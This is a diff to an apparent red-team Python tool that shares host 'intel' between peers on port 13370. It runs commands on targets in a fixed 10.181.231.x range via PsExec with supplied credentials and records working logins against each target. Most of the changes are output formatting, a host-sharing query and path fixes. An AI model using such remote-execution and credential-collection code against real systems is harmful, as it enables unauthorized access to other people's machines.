@@ -46,7 +46,7 @@ intelSources = []
 regex_ipv4 = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
 
 root_path = r"C:\Users\Admin"
-psexec_path = root_path + r"\pstools\psexec"
+psexec_path = root_path + r"\pstools\psexec.exe"
 nbtscan_path = root_path + r"\nbtscan.exe"
 
 # CRYPTO INIT
@@ -122,7 +122,6 @@ def intelInit():
     global intel
 
     getIntelSources()
-
     if not os.path.exists("intel.txt"):
         with open("intel.txt", "w+") as file:
             file.write("")
@@ -240,12 +239,21 @@ class client(Thread):
                 return "Done"
 
         if cmd[0] == "get":
-            host = cmd[1]
-            info = cmd[2]
-            if host in intel:
-                return "|".join(intel[host])
+            if cmd[1] == "ALLHOSTS":
+                retstring = ""
+                for i in range(0, len(ipNames)):
+                    retstring += ipNames[i]
+                    for x in range(0, len(customLists[i])):
+                        retstring += "|" + str(customLists[i][x])
+                    retstring += ","
+                return(retstring)
             else:
-                return "No information at this time"
+                host = cmd[1]
+                info = cmd[2]
+                if host in intel:
+                    return "|".join(intel[host])
+                else:
+                    return "No information at this time"
 
 
 # =============================================================================
@@ -285,6 +293,17 @@ def updateIntel(host, info, action="add", online=True, suppress=False):
             for comp in intelSources:
                 makeRequest(comp, 13370, "remove", host, info)
     intelWrite(suppress)
+
+def updateHosts():
+    global ipNames
+    global customLists
+    for comp in intelSources:
+        print("requesting")
+        try:
+            remoteHosts = makeRequest(comp, 13370, "get", "ALLHOSTS", "")
+            print(remoteHosts)
+        except:
+            pass
 
 
 def menu():
@@ -349,9 +368,10 @@ def menu():
 
         if cmd[0] == "hosts":
             if len(customLists) > 0:
-                print("\n[+] TARGETS " + str(customLists[0]).replace(" ", ""))
+                print("[!] Showing host information")
+                print("|\n|__[+] TARGETS\n|  |\n|  |__" + str(customLists[0]).replace(" ", ""))
                 for i in range(1, len(ipNames)):
-                    print("[+] %s %s" % (ipNames[i], str(customLists[i])))
+                    print("|\n|__[+] %s\n|  |\n|  |__%s" % (ipNames[i], str(customLists[i])))
             else:
                 print("\n[!] No hosts found, run scan to detect")
 
@@ -413,11 +433,11 @@ def menu():
 
 def getintel(host):
     returnIntel = []
-    print("\n[!] Showing information for %s\n|" % host)
+    print("\n[!] Showing information for %s" % host)
     for comp in intelSources:
         try:
             info = makeRequest(comp, 13370, "get", host, "")
-            print("[+] Source: %s\n|" % comp)
+            print("|\n|__[+] Source: %s" % comp)
             if "|" in info:
                 info = info.split("|")
             else:
@@ -427,8 +447,7 @@ def getintel(host):
                     if "No information" not in item:
                         updateIntel(host, item, False, suppress=True)
                         returnIntel.append(item)
-                    print("|----[+] %s" % item)
-
+                    print("|  |\n|  |__[+] %s" % item)
         except Exception:
             pass
 
@@ -497,7 +516,7 @@ def rexecT(tgt=0, uname="", pword="", cmd="", index=0, sav=False, listIndex=0): 
 
     ending = tgt
     tgt = "10.181.231." + str(tgt)
-    psexecString = psexec_path + r" -nobanner \\%s -u %s -p %s cmd /k '%s && exit' 2> nul" % (tgt, uname, pword, cmd)
+    psexecString = psexec_path + r' -nobanner \\%s -u %s -p %s cmd /k "%s && exit" 2> nul' % (tgt, uname, pword, cmd)
     resp = os.system(psexecString)
     if sav and tgt not in customLists[listIndex]:
         infostring = "LOGIN: " + uname + ":" + pword
@@ -595,7 +614,7 @@ def getDependencies():
                 file.write(response.content)
                 file.close()
                 with zipfile.ZipFile(r"pstools.zip", 'r') as zip_ref:
-                    zip_ref.extractall(psexec_path)
+                    zip_ref.extractall(root_path + r"\pstools")
                 os.remove("pstools.zip")
             else:
                 print("Failed to get PSExec dependency")
